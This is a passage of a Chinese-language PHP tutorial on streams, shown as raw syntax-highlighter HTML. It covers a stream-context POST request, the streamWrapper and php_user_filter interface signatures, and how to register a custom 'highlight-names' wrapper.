class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c982455620803-22\"><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">handle</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-e\">fopen</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"https://example.com/register\"</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-s\">\"r\"</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-v\">context</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c982455620803-23\"><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">response</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-e\">stream_get_contents</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">handle</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c982455620803-24\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c982455620803-25\"><span class=\"crayon-e\">fclose</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">handle</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0027 seconds] -->\r\n<p>在这个例子中，我们正在尝试向API发出POST请求。 API终端是安全的，但我们仍然需要使用http上下文属性（用于http和https）。我们设置一些消息头参数，并打开一个文件句柄到API。由于上下文处理写操作，我们可以将句柄打开为只读。</p>\n<p>查看<a href=\"https://php.net/function.stream-context-create\" target=\"_blank\" rel=\"nofollow\">文档</a>了解更多<i>。</i></p>\n<h3>制定自定义协议和过滤器</h3>\n<p>在我们结束之前，让我们谈谈制定自定义协议。 如果你查看<a href=\"https://php.net/manual/en/class.streamwrapper.php\" target=\"_blank\" rel=\"nofollow\">文档</a>，你可以找到一个示例类来实现：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634cc88c986104134129\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nProtocol {\r\n    public resource $context;\r\n    public __construct ( void )\r\n    public __destruct ( void )\r\n    public bool dir_closedir ( void )\r\n    public bool dir_opendir ( string $path , int $options )\r\n    public string dir_readdir ( void )\r\n    public bool dir_rewinddir ( void )\r\n    public bool mkdir ( string $path , int $mode , int $options )\r\n    public bool rename ( string $path_from , string $path_to )\r\n    public bool rmdir ( string $path , int $options )\r\n    public resource stream_cast ( int $cast_as )\r\n    public void stream_close ( void )\r\n    public bool stream_eof ( void )\r\n    public bool stream_flush ( void )\r\n    public bool stream_lock ( int $operation )\r\n    public bool stream_metadata ( string $path , int $option , mixed $value )\r\n    public bool stream_open ( string $path , string $mode , int $options ,\r\n        string &amp;$opened_path )\r\n    public string stream_read ( int $count )\r\n    public bool stream_seek ( int $offset , int $whence = SEEK_SET )\r\n    public bool stream_set_option ( int $option , int $arg1 , int $arg2 )\r\n    public array stream_stat ( void )\r\n    public int stream_tell ( void )\r\n    public bool stream_truncate ( int $new_size )\r\n    public int stream_write ( string $data )\r\n    public bool unlink ( string $path )\r\n    public array url_stat ( string $path , int $flags )\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c986104134129-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c986104134129-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c986104134129-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c986104134129-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c986104134129-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c986104134129-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c986104134129-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c986104134129-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c986104134129-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c986104134129-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c986104134129-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c986104134129-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c986104134129-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c986104134129-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c986104134129-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c986104134129-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c986104134129-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c986104134129-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c986104134129-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c986104134129-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c986104134129-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c986104134129-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c986104134129-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c986104134129-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c986104134129-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c986104134129-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c986104134129-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c986104134129-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c986104134129-29\">29</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634cc88c986104134129-1\"><span class=\"crayon-e\">Protocol</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c986104134129-2\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-i\">resource</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-v\">context</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c986104134129-3\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-v\">_</span><span class=\"crayon-sy\">_</span>construct <span class=\"crayon-sy\">(</span> <span class=\"crayon-t\">void</span> <span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c986104134129-4\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-v\">_</span><span class=\"crayon-sy\">_</span>destruct <span class=\"crayon-sy\">(</span> <span class=\"crayon-t\">void</span> <span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c986104134129-5\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">bool</span> <span class=\"crayon-v\">dir</span><span class=\"crayon-sy\">_</span>closedir <span class=\"crayon-sy\">(</span> <span class=\"crayon-t\">void</span> <span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c986104134129-6\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">bool</span> <span class=\"crayon-v\">dir</span><span class=\"crayon-sy\">_</span>opendir <span class=\"crayon-sy\">(</span> <span class=\"crayon-t\">string</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">path</span> <span class=\"crayon-sy\">,</span> <span class=\"crayon-t\">int</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">options</span> <span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c986104134129-7\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">string</span> <span class=\"crayon-v\">dir</span><span class=\"crayon-sy\">_</span>readdir <span class=\"crayon-sy\">(</span> <span class=\"crayon-t\">void</span> <span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c986104134129-8\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">bool</span> <span class=\"crayon-v\">dir</span><span class=\"crayon-sy\">_</span>rewinddir <span class=\"crayon-sy\">(</span> <span class=\"crayon-t\">void</span> <span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c986104134129-9\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">bool</span> <span class=\"crayon-i\">mkdir</span> <span class=\"crayon-sy\">(</span> <span class=\"crayon-t\">string</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">path</span> <span class=\"crayon-sy\">,</span> <span class=\"crayon-t\">int</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">mode</span> <span class=\"crayon-sy\">,</span> <span class=\"crayon-t\">int</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">options</span> <span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c986104134129-10\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">bool</span> <span class=\"crayon-i\">rename</span> <span class=\"crayon-sy\">(</span> <span class=\"crayon-t\">string</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-v\">path</span><span class=\"crayon-sy\">_</span>from <span class=\"crayon-sy\">,</span> <span class=\"crayon-t\">string</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-v\">path</span><span class=\"crayon-sy\">_</span>to <span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c986104134129-11\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">bool</span> <span class=\"crayon-i\">rmdir</span> <span class=\"crayon-sy\">(</span> <span class=\"crayon-t\">string</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">path</span> <span class=\"crayon-sy\">,</span> <span class=\"crayon-t\">int</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">options</span> <span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c986104134129-12\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-i\">resource</span> <span class=\"crayon-v\">stream</span><span class=\"crayon-sy\">_</span>cast <span class=\"crayon-sy\">(</span> <span class=\"crayon-t\">int</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-v\">cast</span><span class=\"crayon-sy\">_</span>as <span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c986104134129-13\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">void</span> <span class=\"crayon-v\">stream</span><span class=\"crayon-sy\">_</span>close <span class=\"crayon-sy\">(</span> <span class=\"crayon-t\">void</span> <span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c986104134129-14\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">bool</span> <span class=\"crayon-v\">stream</span><span class=\"crayon-sy\">_</span>eof <span class=\"crayon-sy\">(</span> <span class=\"crayon-t\">void</span> <span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c986104134129-15\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">bool</span> <span class=\"crayon-v\">stream</span><span class=\"crayon-sy\">_</span>flush <span class=\"crayon-sy\">(</span> <span class=\"crayon-t\">void</span> <span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c986104134129-16\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">bool</span> <span class=\"crayon-v\">stream</span><span class=\"crayon-sy\">_</span>lock <span class=\"crayon-sy\">(</span> <span class=\"crayon-t\">int</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">operation</span> <span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c986104134129-17\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">bool</span> <span class=\"crayon-v\">stream</span><span class=\"crayon-sy\">_</span>metadata <span class=\"crayon-sy\">(</span> <span class=\"crayon-t\">string</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">path</span> <span class=\"crayon-sy\">,</span> <span class=\"crayon-t\">int</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">option</span> <span class=\"crayon-sy\">,</span> <span class=\"crayon-i\">mixed</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">value</span> <span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c986104134129-18\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">bool</span> <span class=\"crayon-v\">stream</span><span class=\"crayon-sy\">_</span>open <span class=\"crayon-sy\">(</span> <span class=\"crayon-t\">string</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">path</span> <span class=\"crayon-sy\">,</span> <span class=\"crayon-t\">string</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">mode</span> <span class=\"crayon-sy\">,</span> <span class=\"crayon-t\">int</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">options</span> <span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c986104134129-19\">        <span class=\"crayon-t\">string</span> <span class=\"crayon-o\">&amp;</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">opened</span><span class=\"crayon-sy\">_</span>path <span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c986104134129-20\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">string</span> <span class=\"crayon-v\">stream</span><span class=\"crayon-sy\">_</span>read <span class=\"crayon-sy\">(</span> <span class=\"crayon-t\">int</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">count</span> <span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c986104134129-21\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">bool</span> <span class=\"crayon-v\">stream</span><span class=\"crayon-sy\">_</span>seek <span class=\"crayon-sy\">(</span> <span class=\"crayon-t\">int</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">offset</span> <span class=\"crayon-sy\">,</span> <span class=\"crayon-t\">int</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">whence</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-v\">SEEK</span><span class=\"crayon-sy\">_</span>SET <span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c986104134129-22\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">bool</span> <span class=\"crayon-v\">stream_set</span><span class=\"crayon-sy\">_</span>option <span class=\"crayon-sy\">(</span> <span class=\"crayon-t\">int</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">option</span> <span class=\"crayon-sy\">,</span> <span class=\"crayon-t\">int</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">arg1</span> <span class=\"crayon-sy\">,</span> <span class=\"crayon-t\">int</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">arg2</span> <span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c986104134129-23\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">array</span> <span class=\"crayon-v\">stream</span><span class=\"crayon-sy\">_</span>stat <span class=\"crayon-sy\">(</span> <span class=\"crayon-t\">void</span> <span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c986104134129-24\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">int</span> <span class=\"crayon-v\">stream</span><span class=\"crayon-sy\">_</span>tell <span class=\"crayon-sy\">(</span> <span class=\"crayon-t\">void</span> <span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c986104134129-25\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">bool</span> <span class=\"crayon-v\">stream</span><span class=\"crayon-sy\">_</span>truncate <span class=\"crayon-sy\">(</span> <span class=\"crayon-t\">int</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-v\">new</span><span class=\"crayon-sy\">_</span>size <span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c986104134129-26\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">int</span> <span class=\"crayon-v\">stream</span><span class=\"crayon-sy\">_</span>write <span class=\"crayon-sy\">(</span> <span class=\"crayon-t\">string</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">data</span> <span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c986104134129-27\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">bool</span> <span class=\"crayon-i\">unlink</span> <span class=\"crayon-sy\">(</span> <span class=\"crayon-t\">string</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">path</span> <span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c986104134129-28\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">array</span> <span class=\"crayon-v\">url</span><span class=\"crayon-sy\">_</span>stat <span class=\"crayon-sy\">(</span> <span class=\"crayon-t\">string</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">path</span> <span class=\"crayon-sy\">,</span> <span class=\"crayon-t\">int</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">flags</span> <span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c986104134129-29\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0080 seconds] -->\r\n<p>我们不打算实现其中的一个，因为我认为它应该有自己的教程。这里有很多工作需要完成。但是一旦这个工作完成，我们可以很容易地注册我们的流包装：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634cc88c98b932167937\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nif (in_array(\"highlight-names\", stream_get_wrappers())) {\r\n    stream_wrapper_unregister(\"highlight-names\");\r\n}\r\n\r\nstream_wrapper_register(\"highlight-names\", \"HighlightNamesProtocol\");\r\n\r\n$highlighted = file_get_contents(\"highlight-names://story.txt\");</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c98b932167937-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c98b932167937-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c98b932167937-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c98b932167937-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c98b932167937-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c98b932167937-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c98b932167937-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634cc88c98b932167937-1\"><span class=\"crayon-st\">if</span> <span class=\"crayon-sy\">(</span><span class=\"crayon-e\">in_array</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"highlight-names\"</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-e\">stream_get_wrappers</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c98b932167937-2\">    <span class=\"crayon-e\">stream_wrapper_unregister</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"highlight-names\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c98b932167937-3\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c98b932167937-4\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c98b932167937-5\"><span class=\"crayon-e\">stream_wrapper_register</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"highlight-names\"</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-s\">\"HighlightNamesProtocol\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c98b932167937-6\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c98b932167937-7\"><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">highlighted</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-e\">file_get_contents</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"highlight-names://story.txt\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p>同样，也可以创建自定义流过滤器。该<a href=\"https://php.net/manual/en/class.php-user-filter.php\" target=\"_blank\" rel=\"nofollow\">文档</a>有一个示例过滤器类：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634cc88c98e839480669\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nFilter {\r\n    public $filtername;\r\n    public $params\r\n    public int filter ( resource $in , resource $out , int &amp;$consumed ,\r\n        bool $closing )\r\n    public void onClose ( void )\r\n    public bool onCreate ( void )\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c98e839480669-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c98e839480669-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c98e839480669-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c98e839480669-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c98e839480669-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c98e839480669-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c98e839480669-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c98e839480669-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634cc88c98e839480669-1\"><span class=\"crayon-e\">Filter</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c98e839480669-2\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-v\">filtername</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c98e839480669-3\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">params</span></div><div class=\"crayon-line crayon-striped-line\" 